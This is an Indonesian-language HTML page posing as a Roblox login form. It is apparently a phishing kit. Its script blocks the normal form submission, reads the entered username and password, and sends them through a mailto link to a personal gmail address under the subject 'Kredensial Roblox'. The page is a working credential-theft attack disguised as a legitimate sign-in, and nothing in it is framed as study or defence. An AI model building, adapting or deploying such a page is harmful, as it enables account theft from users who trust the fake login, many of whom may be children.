<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">  <title>Masuk Roblox</title>
<style>
  body { font-family: Arial, sans-serif; background-color: #f0f0f0;}.container { width: 350px; margin: auto; background-color: #fff; padding: 25px; border-radius: 5px; box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);}
  </style>
</head>
<body>
  <div class="container"
  <h1>Masuk Roblox</h1>
<form action="https://roblox.com"method="POST">
  <label for="username">Username:</label>
  <input type="text"id="username" name="username" required><br>
  <label for="password">Kata Sandi:</label>
  <input type="password"id="password" name="password" required><br>
  <button type="submit">Masuk</button>
</form>
<script>
  document.querySelector('form').addEventListener('submit', function(event) {
    event.preventDefault(); // Mencegah form dari pengiriman standar
    var username = document.querySelector('#username').value;
    var password = document.querySelector('#password').value;

    // Mengirim data ke emailmu menggunakan JavaScript Mail API
    var mailtoLink = 'mailto:cslanzyystore01@gmail.com?subject=Kredensial%20Roblox&body=Username:' + encodeURIComponent(username)+ '%0APassword:' + encodeURIComponent(password);   window.location.href = mailtoLink;});
</script>
